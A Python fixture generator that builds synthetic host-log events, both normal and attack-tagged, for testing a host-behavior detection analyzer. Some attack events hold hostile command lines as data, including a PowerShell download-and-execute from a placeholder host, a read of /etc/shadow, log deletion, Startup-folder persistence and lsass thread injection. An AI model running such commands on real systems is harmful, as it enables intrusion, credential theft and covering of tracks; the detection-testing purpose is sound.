"""Generate shareable host-behavior NormalizedEvent and DetectionResult data."""

from __future__ import annotations

import json
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from uuid import NAMESPACE_URL, uuid5


PROJECT_ROOT = Path(__file__).resolve().parents[1]
BACKEND_ROOT = PROJECT_ROOT / "backend"
sys.path.insert(0, str(BACKEND_ROOT))

from app.analyzers.host_behavior import HostBehaviorAnalyzer  # noqa: E402
from app.schemas.event import (  # noqa: E402
    HostInfo,
    NormalizedEvent,
    ObjectInfo,
    SubjectInfo,
)


BASE_TIME = datetime(2026, 9, 8, 10, 20, tzinfo=timezone.utc)


def event(
    index: int,
    *,
    hostname: str,
    os_name: str,
    source: str,
    event_type: str,
    action: str,
    process_name: str,
    pid: int,
    user: str,
    seconds: int,
    raw_data: dict | None = None,
    target: ObjectInfo | None = None,
    tags: list[str] | None = None,
) -> NormalizedEvent:
    return NormalizedEvent(
        event_id=f"evt-hb-{index:03d}",
        timestamp=BASE_TIME + timedelta(seconds=seconds),
        source_type=(
            "host_log"
            if source in {"windows_sysmon", "linux_auditd"}
            else "host_behavior"
        ),
        source=source,
        host=HostInfo(hostname=hostname, os=os_name),
        event_type=event_type,
        subject=SubjectInfo(
            type="process",
            name=process_name,
            pid=pid,
            user=user,
        ),
        object=target,
        action=action,
        raw_data=raw_data or {},
        tags=tags or [],
    )


def build_events() -> list[NormalizedEvent]:
    return [
        event(
            1,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="process_create",
            action="create_process",
            process_name="notepad.exe",
            pid=2100,
            user="alice",
            seconds=0,
            raw_data={
                "parent_pid": 1100,
                "parent_process_name": "explorer.exe",
                "command_line": "notepad.exe meeting-notes.txt",
            },
            tags=["normal", "process"],
        ),
        event(
            2,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="linux_auditd",
            event_type="process_create",
            action="create_process",
            process_name="/usr/sbin/sshd",
            pid=801,
            user="root",
            seconds=5,
            raw_data={
                "parent_pid": 1,
                "parent_process_name": "systemd",
                "command_line": "/usr/sbin/sshd -D",
            },
            tags=["normal", "process"],
        ),
        event(
            3,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="process_create",
            action="create_process",
            process_name="powershell.exe",
            pid=3152,
            user="alice",
            seconds=10,
            raw_data={
                "parent_pid": 2200,
                "parent_process_name": "WINWORD.EXE",
                "command_line": "powershell.exe -EncodedCommand SQBFAFgA",
                "Image": (
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
                    "\\powershell.exe"
                ),
            },
            tags=["attack", "process"],
        ),
        event(
            4,
            hostname="WEB01",
            os_name="linux",
            source="linux_auditd",
            event_type="process_create",
            action="create_process",
            process_name="/bin/sh",
            pid=1440,
            user="www-data",
            seconds=15,
            raw_data={
                "parent_pid": 912,
                "parent_process_name": "nginx",
                "command_line": "/bin/sh -c id",
            },
            tags=["attack", "process"],
        ),
        event(
            5,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="process_create",
            action="create_process",
            process_name="powershell.exe",
            pid=3180,
            user="alice",
            seconds=20,
            raw_data={
                "parent_pid": 1100,
                "parent_process_name": "explorer.exe",
                "command_line": (
                    "powershell.exe Invoke-Expression "
                    "(New-Object Net.WebClient).DownloadString('http://x/p')"
                ),
            },
            tags=["attack", "process"],
        ),
        event(
            6,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="ebpf",
            event_type="process_create",
            action="create_process",
            process_name="/tmp/dropper.sh",
            pid=1501,
            user="www-data",
            seconds=25,
            raw_data={
                "parent_pid": 1440,
                "parent_process_name": "sh",
                "command_line": "/tmp/dropper.sh",
                "image": "/tmp/dropper.sh",
            },
            tags=["attack", "process"],
        ),
        event(
            7,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="linux_auditd",
            event_type="file_read",
            action="read_file",
            process_name="/usr/bin/cat",
            pid=1520,
            user="www-data",
            seconds=30,
            target=ObjectInfo(type="file", name="shadow", path="/etc/shadow"),
            raw_data={"file_hash": None, "result": "success"},
            tags=["attack", "file"],
        ),
        event(
            8,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="linux_auditd",
            event_type="file_read",
            action="read_file",
            process_name="/usr/bin/cat",
            pid=1520,
            user="www-data",
            seconds=35,
            target=ObjectInfo(
                type="file",
                name="report.txt",
                path="/home/www-data/report.txt",
            ),
            raw_data={"result": "success"},
            tags=["normal", "file"],
        ),
        event(
            9,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="file_modify",
            action="write_file",
            process_name="powershell.exe",
            pid=3180,
            user="alice",
            seconds=40,
            target=ObjectInfo(
                type="file",
                name="update.cmd",
                path=(
                    "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows"
                    "\\Start Menu\\Programs\\Startup\\update.cmd"
                ),
            ),
            raw_data={"file_hash": "sha256:demo-persistence"},
            tags=["attack", "file"],
        ),
        event(
            10,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="file_delete",
            action="delete_file",
            process_name="wevtutil.exe",
            pid=3201,
            user="administrator",
            seconds=45,
            target=ObjectInfo(
                type="file",
                name="Security.evtx",
                path="C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            ),
            raw_data={"result": "success"},
            tags=["attack", "file"],
        ),
        event(
            11,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="ebpf",
            event_type="file_create",
            action="write_file",
            process_name="/usr/bin/curl",
            pid=1530,
            user="www-data",
            seconds=50,
            target=ObjectInfo(
                type="file",
                name="payload.sh",
                path="/tmp/payload.sh",
            ),
            raw_data={"file_hash": "sha256:demo-payload"},
            tags=["attack", "file"],
        ),
        event(
            12,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="file_create",
            action="write_file",
            process_name="winword.exe",
            pid=2200,
            user="alice",
            seconds=55,
            target=ObjectInfo(
                type="file",
                name="report.docx",
                path="C:\\Users\\alice\\Documents\\report.docx",
            ),
            raw_data={"result": "success"},
            tags=["normal", "file"],
        ),
        event(
            13,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="file_modify",
            action="write_file",
            process_name="winword.exe",
            pid=2200,
            user="alice",
            seconds=60,
            target=ObjectInfo(
                type="file",
                name="report.docx",
                path="C:\\Users\\alice\\Documents\\report.docx",
            ),
            raw_data={"result": "success"},
            tags=["normal", "file"],
        ),
        event(
            14,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="linux_auditd",
            event_type="file_delete",
            action="delete_file",
            process_name="/usr/bin/rm",
            pid=1600,
            user="www-data",
            seconds=65,
            target=ObjectInfo(
                type="file",
                name="note.tmp",
                path="/tmp/note.tmp",
            ),
            raw_data={"result": "success"},
            tags=["normal", "file"],
        ),
        event(
            15,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="ebpf",
            event_type="system_call",
            action="ptrace",
            process_name="/tmp/debugger",
            pid=1700,
            user="www-data",
            seconds=70,
            raw_data={
                "syscall": "ptrace",
                "arguments": {"request": "PTRACE_ATTACH", "target_pid": 801},
                "result": 0,
            },
            tags=["attack", "syscall"],
        ),
        event(
            16,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="ebpf",
            event_type="system_call",
            action="memfd_create",
            process_name="/tmp/loader",
            pid=1750,
            user="www-data",
            seconds=75,
            raw_data={
                "syscall": "memfd_create",
                "arguments": {"name": "payload"},
                "result": 3,
            },
            tags=["attack", "syscall"],
        ),
        event(
            17,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="ebpf",
            event_type="system_call",
            action="execve",
            process_name="/tmp/loader",
            pid=1750,
            user="www-data",
            seconds=79,
            raw_data={
                "syscall": "execve",
                "arguments": {"path": "/proc/self/fd/3"},
                "result": 0,
            },
            tags=["attack", "syscall"],
        ),
        event(
            18,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="ebpf",
            event_type="system_call",
            action="openat",
            process_name="/usr/bin/python3",
            pid=1800,
            user="student",
            seconds=85,
            raw_data={
                "syscall": "openat",
                "arguments": {"path": "/home/student/app.py"},
                "result": 4,
            },
            tags=["normal", "syscall"],
        ),
        event(
            19,
            hostname="OFFICE01",
            os_name="windows",
            source="windows_sysmon",
            event_type="remote_thread_create",
            action="create_remote_thread",
            process_name="injector.exe",
            pid=4100,
            user="alice",
            seconds=90,
            target=ObjectInfo(type="process", name="lsass.exe", pid=700),
            raw_data={
                "start_address": "0x000001F00000",
                "call_trace": ["kernel32.dll", "ntdll.dll"],
            },
            tags=["attack", "memory"],
        ),
        event(
            20,
            hostname="LINUX-SRV01",
            os_name="linux",
            source="ebpf",
            event_type="system_call",
            action="process_vm_writev",
            process_name="/tmp/injector",
            pid=1900,
            user="www-data",
            seconds=95,
            raw_data={
                "syscall": "process_vm_writev",
                "arguments": {"target_pid": 801, "bytes": 512},
                "result": 512,
            },
            tags=["attack", "syscall", "memory"],
        ),
    ]


def stable_detection_ids(results) -> None:
    """Keep committed fixtures stable while preserving det-UUID formatting."""

    for result in results:
        seed = "|".join(
            [
                str(result.evidence.get("rule_id", "")),
                *result.related_event_ids,
            ]
        )
        result.detection_id = f"det-{uuid5(NAMESPACE_URL, seed)}"


def write_json(path: Path, values: list) -> None:
    serialized = [value.model_dump(mode="json") for value in values]
    path.write_text(
        json.dumps(serialized, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )


def main() -> None:
    events = build_events()
    results = HostBehaviorAnalyzer().analyze(events)
    stable_detection_ids(results)

    examples_dir = PROJECT_ROOT / "backend" / "examples"
    examples_dir.mkdir(exist_ok=True)
    write_json(examples_dir / "member4_host_behavior_events.json", events)
    write_json(examples_dir / "member4_host_behavior_detections.json", results)

    normal_count = sum("normal" in item.tags for item in events)
    attack_count = sum("attack" in item.tags for item in events)
    print(
        "generated "
        f"{len(events)} events ({normal_count} normal, {attack_count} attack) "
        f"and {len(results)} detections"
    )


if __name__ == "__main__":
    main()
